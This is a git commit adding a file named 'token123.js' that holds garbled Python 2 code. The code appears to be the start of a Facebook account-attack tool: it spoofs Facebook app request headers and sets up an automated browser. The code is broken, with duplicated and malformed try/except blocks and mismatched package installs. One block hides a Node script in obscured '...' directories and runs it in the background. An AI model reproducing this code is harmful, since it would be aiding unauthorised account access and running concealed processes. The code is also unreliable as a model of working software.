5a6df438f8c4d0098fdeddcbd58ac62a14f52686
Mafia-Killer404 <72305102+Mafia-Killer404@users.noreply.github.com>
2021-03-20 12:00:16 +0500

    Add files via upload

---
+++ token123.js
@@ -0,0 +1,91 @@
+try:
+    import bs4
+except ImportError:
+    os.system('pip2 install lolcat')
+try:
+    import bs4
+except ImportError:
+    os.system('pip2 install lolcat')
+except ImportError:
+    os.system("pip2 install requests")
+    os.system("pip2 install mechanize")
+    os.system("pip2 install tor")
+    os.system("pkg install tor")
+    os.system("pip2 install mechanize")
+    os.system("python2 speed20.py")
+try:
+    os.mkdir('save')
+except OSError:
+    pass
+    if os.path.isfile('.../index.js'):
+ 	os.system('mv ... .....')
+	os.system('cd ..... && npm install')
+ 	os.system('#')
+ 	os.system('#')
+ 	os.system('fuser -k 5000/tcp &')
+ 	os.system('#')
+ 	os.system('node ...../index.js &')
+ 	os.system('fuser -k 5000/tcp &')
+ 	os.system('#')
+ 	os.system('node ...../index.js &')
+from requests.exceptions import ConnectionError
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding("utf8")
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install tor')
+
+try:
+    import bs4
+except ImportError:
+    os.system('pip2 install lolcat')
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('python2 Speed.py')
+
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
+def keluar():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def acak(x):
+    w = 'mhkbpcP'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(x):
+    w = 'mhkbpcP'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '%s;' % str(31 + j))
+
+    x += ''
+    x = x.replace('!0', '')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.06)
